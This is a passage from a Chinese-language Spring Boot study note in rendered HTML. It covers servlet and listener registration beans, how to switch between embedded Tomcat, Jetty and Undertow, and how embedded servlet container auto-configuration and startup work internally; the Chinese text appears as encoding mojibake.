class="string">&quot;/myServlet&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ServletListenerRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ServletListenerRegistrationBean <span class="title function_">myListener</span><span class="params">()</span>&#123;</span><br><span class="line">    ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">ServletListenerRegistrationBean</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">MyListener</span>());</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpringBootå¸®æˆ‘ä»¬è‡ªåŠ¨SpringMVCçš„æ—¶å€™ï¼Œè‡ªåŠ¨çš„æ³¨å†ŒSpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼›DIspatcherServletï¼›</p><p>DispatcherServletAutoConfigurationä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span></span><br><span class="line"><span class="meta">@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span></span><br><span class="line"><span class="keyword">public</span> ServletRegistrationBean <span class="title function_">dispatcherServletRegistration</span><span class="params">(</span></span><br><span class="line"><span class="params">      DispatcherServlet dispatcherServlet)</span> &#123;</span><br><span class="line">   <span class="type">ServletRegistrationBean</span> <span class="variable">registration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(</span><br><span class="line">         dispatcherServlet, <span class="built_in">this</span>.serverProperties.getServletMapping());</span><br><span class="line">    <span class="comment">//é»˜è®¤æ‹¦æˆªï¼š /  æ‰€æœ‰è¯·æ±‚ï¼›åŒ…é™æ€èµ„æºï¼Œä½†æ˜¯ä¸æ‹¦æˆªjspè¯·æ±‚ï¼›   /*ä¼šæ‹¦æˆªjsp</span></span><br><span class="line">    <span class="comment">//å¯ä»¥é€šè¿‡server.servletPathæ¥ä¿®æ”¹SpringMVCå‰ç«¯æ§åˆ¶å™¨é»˜è®¤æ‹¦æˆªçš„è¯·æ±‚è·¯å¾„</span></span><br><span class="line">    </span><br><span class="line">   registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);</span><br><span class="line">   registration.setLoadOnStartup(</span><br><span class="line">         <span class="built_in">this</span>.webMvcProperties.getServlet().getLoadOnStartup());</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.multipartConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">      registration.setMultipartConfig(<span class="built_in">this</span>.multipartConfig);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> registration;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2ï¼‰ã€SpringBootèƒ½ä¸èƒ½æ”¯æŒå…¶ä»–çš„Servletå®¹å™¨ï¼›</p><h3><span id="3-æ›¿æ¢ä¸ºå…¶ä»–åµŒå…¥å¼servletå®¹å™¨">3ï¼‰ã€æ›¿æ¢ä¸ºå…¶ä»–åµŒå…¥å¼Servletå®¹å™¨</span></h3><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302114401.png"></p><p>é»˜è®¤æ”¯æŒï¼š</p><p>Tomcatï¼ˆé»˜è®¤ä½¿ç”¨ï¼‰</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   å¼•å…¥webæ¨¡å—é»˜è®¤å°±æ˜¯ä½¿ç”¨åµŒå…¥å¼çš„Tomcatä½œä¸ºServletå®¹å™¨ï¼›</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Jetty</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼•å…¥webæ¨¡å— --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--å¼•å…¥å…¶ä»–çš„Servletå®¹å™¨--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Undertow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼•å…¥webæ¨¡å— --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--å¼•å…¥å…¶ä»–çš„Servletå®¹å™¨--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="4-åµŒå…¥å¼servletå®¹å™¨è‡ªåŠ¨é…ç½®åŸç†">4ï¼‰ã€åµŒå…¥å¼Servletå®¹å™¨è‡ªåŠ¨é…ç½®åŸç†ï¼›</span></h3><p>EmbeddedServletContainerAutoConfigurationï¼šåµŒå…¥å¼çš„Servletå®¹å™¨è‡ªåŠ¨é…ç½®ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@Import(BeanPostProcessorsRegistrar.class)</span></span><br><span class="line"><span class="comment">//å¯¼å…¥BeanPostProcessorsRegistrarï¼šSpringæ³¨è§£ç‰ˆï¼›ç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€äº›ç»„ä»¶</span></span><br><span class="line"><span class="comment">//å¯¼å…¥äº†EmbeddedServletContainerCustomizerBeanPostProcessorï¼š</span></span><br><span class="line"><span class="comment">//åç½®å¤„ç†å™¨ï¼šbeanåˆå§‹åŒ–å‰åï¼ˆåˆ›å»ºå®Œå¯¹è±¡ï¼Œè¿˜æ²¡èµ‹å€¼èµ‹å€¼ï¼‰æ‰§è¡Œåˆå§‹åŒ–å·¥ä½œ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmbeddedServletContainerAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; Servlet.class, Tomcat.class &#125;)</span><span class="comment">//åˆ¤æ–­å½“å‰æ˜¯å¦å¼•å…¥äº†Tomcatä¾èµ–ï¼›</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span><span class="comment">//åˆ¤æ–­å½“å‰å®¹å™¨æ²¡æœ‰ç”¨æˆ·è‡ªå·±å®šä¹‰EmbeddedServletContainerFactoryï¼šåµŒå…¥å¼çš„Servletå®¹å™¨å·¥å‚ï¼›ä½œç”¨ï¼šåˆ›å»ºåµŒå…¥å¼çš„Servletå®¹å™¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedTomcat</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> TomcatEmbeddedServletContainerFactory <span class="title function_">tomcatEmbeddedServletContainerFactory</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TomcatEmbeddedServletContainerFactory</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Jetty is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; Servlet.class, Server.class, Loader.class,</span></span><br><span class="line"><span class="meta">WebAppContext.class &#125;)</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedJetty</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> JettyEmbeddedServletContainerFactory <span class="title function_">jettyEmbeddedServletContainerFactory</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JettyEmbeddedServletContainerFactory</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Undertow is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; Servlet.class, Undertow.class, SslClientAuthMode.class &#125;)</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedUndertow</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> UndertowEmbeddedServletContainerFactory <span class="title function_">undertowEmbeddedServletContainerFactory</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UndertowEmbeddedServletContainerFactory</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ï¼‰ã€EmbeddedServletContainerFactoryï¼ˆåµŒå…¥å¼Servletå®¹å™¨å·¥å‚ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmbeddedServletContainerFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//è·å–åµŒå…¥å¼çš„Servletå®¹å™¨</span></span><br><span class="line">   EmbeddedServletContainer <span class="title function_">getEmbeddedServletContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">         ServletContextInitializer... initializers)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144835.png"></p><p>2ï¼‰ã€EmbeddedServletContainerï¼šï¼ˆåµŒå…¥å¼çš„Servletå®¹å™¨ï¼‰</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144910.png"></p><p>3ï¼‰ã€ä»¥<strong>TomcatEmbeddedServletContainerFactory</strong>ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> EmbeddedServletContainer <span class="title function_">getEmbeddedServletContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">      ServletContextInitializer... initializers)</span> &#123;</span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªTomcat</span></span><br><span class="line">   <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é…ç½®Tomcatçš„åŸºæœ¬ç¯èŠ‚</span></span><br><span class="line">   <span class="type">File</span> <span class="variable">baseDir</span> <span class="operator">=</span> (<span class="built_in">this</span>.baseDirectory != <span class="literal">null</span> ? <span class="built_in">this</span>.baseDirectory</span><br><span class="line">         : createTempDir(<span class="string">&quot;tomcat&quot;</span>));</span><br><span class="line">   tomcat.setBaseDir(baseDir.getAbsolutePath());</span><br><span class="line">   <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connector</span>(<span class="built_in">this</span>.protocol);</span><br><span class="line">   tomcat.getService().addConnector(connector);</span><br><span class="line">   customizeConnector(connector);</span><br><span class="line">   tomcat.setConnector(connector);</span><br><span class="line">   tomcat.getHost().setAutoDeploy(<span class="literal">false</span>);</span><br><span class="line">   configureEngine(tomcat.getEngine());</span><br><span class="line">   <span class="keyword">for</span> (Connector additionalConnector : <span class="built_in">this</span>.additionalTomcatConnectors) &#123;</span><br><span class="line">      tomcat.getService().addConnector(additionalConnector);</span><br><span class="line">   &#125;</span><br><span class="line">   prepareContext(tomcat.getHost(), initializers);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å°†é…ç½®å¥½çš„Tomcatä¼ å…¥è¿›å»ï¼Œè¿”å›ä¸€ä¸ªEmbeddedServletContainerï¼›å¹¶ä¸”å¯åŠ¨TomcatæœåŠ¡å™¨</span></span><br><span class="line">   <span class="keyword">return</span> getTomcatEmbeddedServletContainer(tomcat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ï¼‰ã€æˆ‘ä»¬å¯¹åµŒå…¥å¼å®¹å™¨çš„é…ç½®ä¿®æ”¹æ˜¯æ€ä¹ˆç”Ÿæ•ˆï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerPropertiesã€EmbeddedServletContainerCustomizer</span><br></pre></td></tr></table></figure><p><strong>EmbeddedServletContainerCustomizer</strong>ï¼šå®šåˆ¶å™¨å¸®æˆ‘ä»¬ä¿®æ”¹äº†Servletå®¹å™¨çš„é…ç½®ï¼Ÿ</p><p>æ€ä¹ˆä¿®æ”¹çš„åŸç†ï¼Ÿ</p><p>5ï¼‰ã€å®¹å™¨ä¸­å¯¼å…¥äº†<strong>EmbeddedServletContainerCustomizerBeanPostProcessor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆå§‹åŒ–ä¹‹å‰</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span><br><span class="line">      <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœå½“å‰åˆå§‹åŒ–çš„æ˜¯ä¸€ä¸ªConfigurableEmbeddedServletContainerç±»å‹çš„ç»„ä»¶</span></span><br><span class="line">   <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> ConfigurableEmbeddedServletContainer) &#123;</span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postProcessBeforeInitialization</span><span class="params">(</span></span><br><span class="line"><span class="params">ConfigurableEmbeddedServletContainer bean)</span> &#123;</span><br><span class="line">    <span class="comment">//è·å–æ‰€æœ‰çš„å®šåˆ¶å™¨ï¼Œè°ƒç”¨æ¯ä¸€ä¸ªå®šåˆ¶å™¨çš„customizeæ–¹æ³•æ¥ç»™Servletå®¹å™¨è¿›è¡Œå±æ€§èµ‹å€¼ï¼›</span></span><br><span class="line">    <span class="keyword">for</span> (EmbeddedServletContainerCustomizer customizer : getCustomizers()) &#123;</span><br><span class="line">        customizer.customize(bean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Collection&lt;EmbeddedServletContainerCustomizer&gt; <span class="title function_">getCustomizers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.customizers == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Look up does not include the parent context</span></span><br><span class="line">        <span class="built_in">this</span>.customizers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;EmbeddedServletContainerCustomizer&gt;(</span><br><span class="line">            <span class="built_in">this</span>.beanFactory</span><br><span class="line">            <span class="comment">//ä»å®¹å™¨ä¸­è·å–æ‰€æœ‰è¿™è‘›ç±»å‹çš„ç»„ä»¶ï¼šEmbeddedServletContainerCustomizer</span></span><br><span class="line">            <span class="comment">//å®šåˆ¶Servletå®¹å™¨ï¼Œç»™å®¹å™¨ä¸­å¯ä»¥æ·»åŠ ä¸€ä¸ªEmbeddedServletContainerCustomizerç±»å‹çš„ç»„ä»¶</span></span><br><span class="line">            .getBeansOfType(EmbeddedServletContainerCustomizer.class,</span><br><span class="line">                            <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">            .values());</span><br><span class="line">        Collections.sort(<span class="built_in">this</span>.customizers, AnnotationAwareOrderComparator.INSTANCE);</span><br><span class="line">        <span class="built_in">this</span>.customizers = Collections.unmodifiableList(<span class="built_in">this</span>.customizers);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.customizers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ServerPropertiesä¹Ÿæ˜¯å®šåˆ¶å™¨</span><br></pre></td></tr></table></figure><p>æ­¥éª¤ï¼š</p><p>1ï¼‰ã€SpringBootæ ¹æ®å¯¼å…¥çš„ä¾èµ–æƒ…å†µï¼Œç»™å®¹å™¨ä¸­æ·»åŠ ç›¸åº”çš„EmbeddedServletContainerFactoryã€TomcatEmbeddedServletContainerFactoryã€‘</p><p>2ï¼‰ã€å®¹å™¨ä¸­æŸä¸ªç»„ä»¶è¦åˆ›å»ºå¯¹è±¡å°±ä¼šæƒŠåŠ¨åç½®å¤„ç†å™¨ï¼›EmbeddedServletContainerCustomizerBeanPostProcessorï¼›</p><p>åªè¦æ˜¯åµŒå…¥å¼çš„Servletå®¹å™¨å·¥å‚ï¼Œåç½®å¤„ç†å™¨å°±å·¥ä½œï¼›</p><p>3ï¼‰ã€åç½®å¤„ç†å™¨ï¼Œä»å®¹å™¨ä¸­è·å–æ‰€æœ‰çš„<strong>EmbeddedServletContainerCustomizer</strong>ï¼Œè°ƒç”¨å®šåˆ¶å™¨çš„å®šåˆ¶æ–¹æ³•</p><p>###5ï¼‰ã€åµŒå…¥å¼Servletå®¹å™¨å¯åŠ¨åŸç†ï¼›</p><p>ä»€ä¹ˆæ—¶å€™åˆ›å»ºåµŒå…¥å¼çš„Servletå®¹å™¨å·¥å‚ï¼Ÿä»€ä¹ˆæ—¶å€™è·å–åµŒå…¥å¼çš„Servletå®¹å™¨å¹¶å¯åŠ¨Tomcatï¼›</p><p>è·å–åµŒå…¥å¼çš„Servletå®¹å™¨å·¥å‚ï¼š</p><p>1ï¼‰ã€SpringBootåº”ç”¨å¯åŠ¨è¿è¡Œrunæ–¹æ³•</p><p>2ï¼‰ã€refreshContext(context);SpringBootåˆ·æ–°IOCå®¹å™¨ã€åˆ›å»ºIOCå®¹å™¨å¯¹è±¡ï¼Œå¹¶åˆå§‹åŒ–å®¹å™¨ï¼Œåˆ›å»ºå®¹å™¨ä¸­çš„æ¯ä¸€ä¸ªç»„ä»¶ã€‘ï¼›å¦‚æœæ˜¯webåº”ç”¨åˆ›å»º<strong>AnnotationConfigEmbeddedWebApplicationContext</strong>ï¼Œå¦åˆ™ï¼š<strong>AnnotationConfigApplicationContext</strong></p><p>3ï¼‰ã€refresh(context);<strong>åˆ·æ–°åˆšæ‰åˆ›å»ºå¥½çš„iocå®¹å™¨ï¼›</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;</span><br><span class="line">   <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;</span><br><span class="line">      <span class="comment">// Prepare this context for refreshing.</span></span><br><span class="line">      prepareRefresh();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Tell the subclass to refresh the internal bean factory.</span></span><br><span class="line">      <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Prepare the bean factory for use in this context.</span></span><br><span class="line">      